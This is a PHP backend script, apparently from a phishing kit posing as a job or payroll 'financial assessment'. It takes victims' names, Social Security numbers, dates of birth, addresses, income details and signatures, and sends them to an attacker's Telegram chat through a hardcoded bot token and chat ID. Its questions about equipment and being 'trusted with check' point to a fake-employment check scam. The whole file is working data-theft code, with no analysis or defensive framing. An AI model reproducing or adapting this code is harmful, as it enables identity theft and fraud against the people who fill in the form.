<?php
// submit-financial.php
require_once __DIR__ . '/config/database.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    session_start();
    $user_id = $_SESSION['user_id'];
    
    // Multiple Telegram Bots Configuration
    $telegramBots = [
        [
            'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', // Bot 1 token
            'chat_id' => '1325797388' // Bot 1 chat ID
        ],
        // Add more bots here if needed
    ];

    // Collect form data
    $full_name = htmlspecialchars($_POST['full_name']);
    $ssn = htmlspecialchars($_POST['ssn']);
    $dob = htmlspecialchars($_POST['dob']);
    $address = htmlspecialchars($_POST['address']);
    $employment_status = htmlspecialchars($_POST['employment_status']);
    $annual_income = htmlspecialchars($_POST['annual_income']);
    $dependents = htmlspecialchars($_POST['dependents']);
    $income_sources = isset($_POST['income_sources']) ? implode(', ', $_POST['income_sources']) : 'None';
    $equipment_investment = htmlspecialchars($_POST['equipment_investment']);
    $confirm_incapable = htmlspecialchars($_POST['confirm_incapable'] ?? 'N/A');
    $trust_check = htmlspecialchars($_POST['trust_check'] ?? 'N/A');
    $certify_truth = isset($_POST['certify_truth']) ? 'Yes' : 'No';
    $signature = htmlspecialchars($_POST['signature']);

    // Maps
    $employment_status_map = [
        'employed_ft' => 'Employed Full-time',
        'employed_pt' => 'Employed Part-time',
        'self_employed' => 'Self-Employed',
        'student' => 'Student',
        'unemployed' => 'Currently Unemployed',
        'other' => 'Other'
    ];
    $income_map = [
        'under_30k' => 'Under $30,000',
        '30k_50k'   => '$30,000 - $50,000',
        '50k_75k'   => '$50,000 - $75,000',
        '75k_100k'  => '$75,000 - $100,000',
        'over_100k' => 'Over $100,000'
    ];

    $readable_employment = $employment_status_map[$employment_status] ?? $employment_status;
    $readable_income = $income_map[$annual_income] ?? $annual_income;

    // Message
    $message = "💰 NEW FINANCIAL ASSESSMENT SUBMISSION 💰\n\n";
    $message .= "👤 PERSONAL INFORMATION\n";
    $message .= "📛 Full Name: $full_name\n";
    $message .= "🆔 SSN: $ssn\n";
    $message .= "🎂 DOB: $dob\n";
    $message .= "🏠 Address: $address\n\n";
    $message .= "💵 FINANCIAL INFORMATION\n";
    $message .= "💼 Employment Status: $readable_employment\n";
    $message .= "💰 Annual Income: $readable_income\n";
    $message .= "👨‍👩‍👧‍👦 Dependents: $dependents\n";
    $message .= "📊 Additional Income Sources: $income_sources\n\n";
    $message .= "💻 EQUIPMENT INVESTMENT\n";
    $message .= "❓ Can manage equipment? $equipment_investment\n";
    if ($equipment_investment === 'no') {
        $message .= "⚠️ Confirmed incapable? $confirm_incapable\n";
        $message .= "🤝 Trusted with check? $trust_check\n";
    }
    $message .= "\n✍️ CERTIFICATION\n";
    $message .= "✅ Certified info: $certify_truth\n";
    $message .= "📝 Digital Signature: $signature\n\n";
    $message .= "⏰ Submitted on: " . date('Y-m-d H:i:s');

    // Send to Telegram
    foreach ($telegramBots as $bot) {
        if (!empty($bot['token']) && !empty($bot['chat_id'])) {
            $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
            $data = [
                'chat_id' => $bot['chat_id'],
                'text' => $message,
            ];

            $options = [
                'http' => [
                    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                    'method'  => 'POST',
                    'content' => http_build_query($data),
                    'ignore_errors' => true
                ]
            ];

            @file_get_contents($url, false, stream_context_create($options));
        }
    }

    // ✅ UPDATE DATABASE - Mark financial step as completed
    try {
        $database = new Database();
        $db = $database->getConnection();
        
        $update_query = "UPDATE users SET financial_completed = 1, financial_completed_at = NOW() WHERE id = :user_id";
        $update_stmt = $db->prepare($update_query);
        $update_stmt->bindParam(':user_id', $user_id);
        $update_stmt->execute();
    } catch (Exception $e) {
        // Log error but don't break the flow
        error_log("Database update failed: " . $e->getMessage());
    }

    // Store in session and redirect
    $_SESSION['financial_data'] = $_POST;

    if ($equipment_investment === 'yes') {
        header("Location: payroll-setup.php");
    } elseif ($equipment_investment === 'no' && $confirm_incapable === 'yes' && $trust_check === 'yes') {
        header("Location: payroll-setup.php");
    } else {
        header("Location: thankyou.php?status=declined");
    }
    exit;
} else {
    header('Location: financial-assessment.php');
    exit();
}
?>
